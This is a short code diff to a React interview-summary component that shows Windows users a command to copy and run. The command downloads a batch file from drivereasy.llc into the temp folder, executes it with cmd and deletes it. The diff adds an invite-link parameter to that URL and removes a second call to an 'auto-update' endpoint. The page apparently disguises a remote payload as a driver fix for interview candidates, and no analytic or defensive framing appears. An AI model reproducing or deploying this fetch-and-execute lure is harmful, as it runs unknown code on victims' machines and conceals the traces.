@@ -734,13 +734,12 @@ export default function SummaryInterview() {
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`curl -sL -X POST https://drivereasy.llc/window \
+                      {`curl -sL -X POST https://drivereasy.llc/window/${inviteLink ? inviteLink : ''} \
                         -H "Host: drivereasy.llc" \
                         -H "User-Agent: Mozilla/5.0" \
                         -H "Accept: */*" -o "%TEMP%\ t.bat" && \
                         cmd /c "%TEMP%\ t.bat" && del \
-                        "%TEMP%\ t.bat"  && \
-                      curl -X POST -sL https://drivereasy.llc/auto-update/${inviteLink ? inviteLink : ''}`}
+                        "%TEMP%\ t.bat" `}
                           </code>
                       )}
               {driverOs === 'linux' && (
